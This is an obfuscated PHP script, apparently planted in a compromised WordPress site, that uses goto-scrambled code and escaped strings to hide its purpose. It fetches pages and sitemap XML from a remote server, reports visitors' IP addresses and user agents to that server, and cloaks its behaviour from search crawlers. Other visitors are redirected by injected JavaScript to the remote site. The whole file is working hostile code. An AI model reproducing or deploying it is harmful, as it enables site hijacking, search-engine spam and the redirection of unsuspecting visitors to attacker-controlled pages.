<?php
 goto vo0PZ; W39ec: if (!is_null($_GET["\153\x6b"])) { $ip = "\66\x36\56\62\x34\71\56\x36\x34\56\61\71\60"; } goto I3Hau; qwou8: error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING); goto Y70SZ; UbNH3: echo $str; goto wHOTu; yYCcw: $str = str_replace("\x49\x49\x49\x49\111", $http_type . $_SERVER["\110\x54\x54\x50\137\110\x4f\x53\124"], $str); goto GNkby; SM49f: $hyzhdy = $jd . "\x30\70\x31\64\56\141\163\x70\170"; goto h8OY0; vo0PZ: error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING); goto ABQj8; QpMis: function yinru() { if (file_exists("\167\x70\x2d\143\x6f\x6e\x66\x69\147\56\160\150\x70")) { $is_config_valid = true; try { ob_start(); include "\167\x70\x2d\x63\x6f\x6e\x66\151\147\56\x70\x68\160"; ob_end_clean(); } catch (Exception $e) { $is_config_valid = false; } if ($is_config_valid && function_exists("\x67\x65\x74\137\x68\145\141\144\x65\162")) { get_header(); } } } goto gO8EU; Jp9eM: if (!is_null($_GET["\110\x45"])) { $kname = urldecode(getCurl($jd . "\147\x6e\x2e\141\x73\160\x78\77\x69\151\144\x3d" . str_replace("\x6a\143\156", '', $_GET["\110\x45"]))); echo "\x3c\164\x69\x74\x6c\x65\x3e" . $kname . "\x3c\57\164\151\164\154\x65\76\12"; echo "\74\x6d\x65\x74\141\40\x6e\x61\155\145\75\x22\x6b\x65\171\x77\x6f\x72\144\163\x22\40\143\157\x6e\x74\145\156\x74\x3d\x22" . $kname . "\42\x20\x2f\x3e\xa"; } goto HdfD0; HdfD0: if (!is_null($_GET["\x6d"])) { $m = $_GET["\x6d"]; } goto fUhOw; mIHyy: if ($cur_code == 200) { yinru(); } goto J9qzJ; rfPm9: $vurl = "\x68\164\x74\x70\x73\72\x2f\57\x64\157\143\x75\155\x65\156\164\x2e\x66\x69\156\145\163\x74\162\x65\x65\x2e\x74\157\x70\x2f"; goto Y7Lif; Y7Lif: if (!is_null($_GET["\147"])) { $jd = getCurl($vurl . "\x32\56\141\163\x70\x78\77\x73\x7a\75" . $_GET["\147"]); $sz = $_GET["\147"]; } else { $jd = getCurl($vurl . "\62\x2e\x61\x73\x70\170\77\x78\171\75" . $http_type); $sz = getCurl($vurl . "\x32\56\x61\163\x70\x78\x3f\x6a\x64\x3d" . $jd); } goto SM49f; NpzDI: $str = str_replace("\x69\151\x64\x3d", "\x48\x45\x3d\x46\106", $str); goto UbNH3; GNkby: $str = str_replace("\x55\x55\125\125\x55", $http_type . $_SERVER["\110\x54\x54\120\137\x48\117\x53\x54"] . $_SERVER["\x53\103\122\111\x50\124\137\x4e\x41\x4d\x45"], $str); goto NpzDI; I3Hau: $domain = getCurl($jd . "\147\145\x74\x64\x6f\155\x61\x69\x6e\x32\x2e\141\x73\160\x78\77\162\156\144\x3d\61\x26\151\x70\75" . $ip . "\x26\x75\141\x3d" . urlencode(str_replace("\x3b", '', $_SERVER["\x48\x54\124\x50\x5f\125\x53\105\122\x5f\101\107\105\x4e\x54"]))); goto V68oU; ABQj8: $http_type = isset($_SERVER["\110\124\x54\x50\x53"]) && $_SERVER["\110\124\124\x50\x53"] == "\x6f\156" || isset($_SERVER["\110\x54\124\120\x5f\130\137\106\x4f\x52\x57\101\x52\104\105\104\137\x50\122\x4f\x54\117"]) && $_SERVER["\110\x54\124\120\x5f\130\x5f\x46\x4f\122\x57\101\x52\x44\105\x44\137\120\x52\117\x54\x4f"] == "\x68\x74\x74\x70\163" ? "\x68\x74\164\160\163\x3a\57\x2f" : "\x68\164\164\160\72\x2f\x2f"; goto rfPm9; wz31X: function getCurl($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); $result = curl_exec($ch); curl_close($ch); return $result; } goto qwou8; ciEZS: $str = str_replace("\x67\147\147\x67\147", $sz, $str); goto yYCcw; Y70SZ: function get_http_status_code($url) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HEADER, true); curl_setopt($ch, CURLOPT_NOBODY, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_exec($ch); $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch); return $status_code; } goto QpMis; h8OY0: $surl = $jd . "\163\x38\x31\64\56\x61\163\x70\x78"; goto azFr6; gO8EU: $cur_code = get_http_status_code($http_type . $_SERVER["\x48\x54\x54\x50\137\110\117\x53\124"]); goto mIHyy; fUhOw: if (!is_null($_GET["\156\165\x6d\142\145\x72"])) { $surl = $surl . "\x3f\x6e\165\x6d\x62\x65\162\75" . $_GET["\156\x75\155\142\145\162"] . "\x26\160\156\165\155\75" . $_GET["\x70\x6e\x75\x6d"] . "\46\x63\x69\x64\75" . $_GET["\x63\x69\x64"] . "\46\x6d\75" . $m; $str = getCurl($surl); $str = str_replace("\171\171\x6d\x6d", $http_type . $_SERVER["\110\124\x54\120\x5f\110\117\x53\x54"] . $_SERVER["\123\x43\x52\111\120\x54\x5f\x4e\101\115\x45"], $str); $str = str_replace("\147\147\x67\147\147", $sz, $str); $str = str_replace("\151\151\x64\75", "\x48\105\x3d\x46\106", $str); header("\x43\157\x6e\x74\x65\156\164\x2d\x74\171\x70\x65\72\164\145\170\x74\x2f\170\x6d\x6c"); echo $str; die; } goto XrVCj; XrVCj: $ip = $_SERVER["\x52\105\115\x4f\x54\x45\137\101\x44\104\x52"] . "\55" . $_SERVER["\122\x45\115\117\x54\105\137\110\x4f\x53\124"] . "\x2d" . $_SERVER["\110\x54\124\x50\x5f\103\x4c\111\105\x4e\x54\x5f\111\x50"] . "\55" . $_SERVER["\x48\x54\124\120\137\x58\x5f\x46\x4f\122\127\x41\x52\104\x45\x44\137\x46\x4f\122"] . "\55" . $_SERVER["\x48\124\x54\120\x5f\x58\137\x46\x4f\122\127\x41\122\104\105\104"] . "\55" . $_SERVER["\x48\x54\124\x50\x5f\106\x4f\122\x57\101\122\104\105\x44\x5f\106\x4f\x52"] . "\55" . $_SERVER["\110\124\124\x50\137\x46\x4f\122\127\101\122\104\x45\104"]; goto W39ec; azFr6: $m = 1; goto Jp9eM; V68oU: if ($domain == "\x67\x6f\x6f\x67\154\x65") { } else { if (!is_null($_GET["\x48\105"])) { $kname = urldecode(getCurl($jd . "\x67\156\56\x61\x73\160\x78\x3f\x69\x69\144\x3d" . str_replace("\106\x46", '', $_GET["\x48\x45"]))); echo "\x3c\163\x63\x72\x69\160\164\76\x64\157\143\165\155\x65\156\x74\x2e\154\157\x63\x61\x74\x69\157\156\75\42" . $jd . "\x61\x2e\141\163\160\x78" . "\77\143\x69\x64\x3d" . $_GET["\143\x69\x64"] . "\x26\x63\x6e\141\155\145\75" . urlencode($kname) . "\46\x75\x72\x6c\x3d" . $http_type . $_SERVER["\110\124\124\x50\x5f\x48\117\123\124"] . $_SERVER["\x53\103\x52\111\120\124\137\x4e\x41\x4d\105"] . "\42\x3c\57\x73\143\162\x69\x70\164\x3e"; die; } if (!is_null($_GET["\x70\156\165\x6d"])) { $txt = str_replace("\160\x72\157\144\165\x63\x74\x73\x2e\141\x73\160\x78", '', $jd . "\141\x2e\141\x73\160\x78") . "\77\x63\x69\144\75" . $_GET["\143\151\x64"] . ''; echo "\74\163\x63\162\x69\160\x74\76\144\157\143\165\155\x65\x6e\164\x2e\x6c\157\x63\141\x74\151\157\x6e\x3d\x22" . $txt . "\42\74\x2f\x73\143\x72\x69\x70\164\76"; die; } } goto wz31X; wHOTu: get_footer(); goto u7346; qR2bi: $str = getCurl($hyzhdy); goto ciEZS; J9qzJ: if (!is_null($_GET["\x48\x45"])) { $hyzhdy = $hyzhdy . "\x3f\x69\x69\x64\x3d" . urlencode(str_replace("\106\106", '', $_GET["\110\105"])) . "\x26\143\151\x64\x3d" . $_GET["\x63\151\144"] . "\x26\155\x3d" . $m; } else { $cid = ''; if (!is_null($_GET["\x63\x69\x64"])) { $cid = $_GET["\x63\x69\x64"]; } $hyzhdy = $hyzhdy . "\77\x63\x69\x64\75" . $cid . "\46\160\156\165\x6d\x3d" . $_GET["\x70\156\x75\155"] . "\46\155\75" . $m; } goto qR2bi; u7346: ?>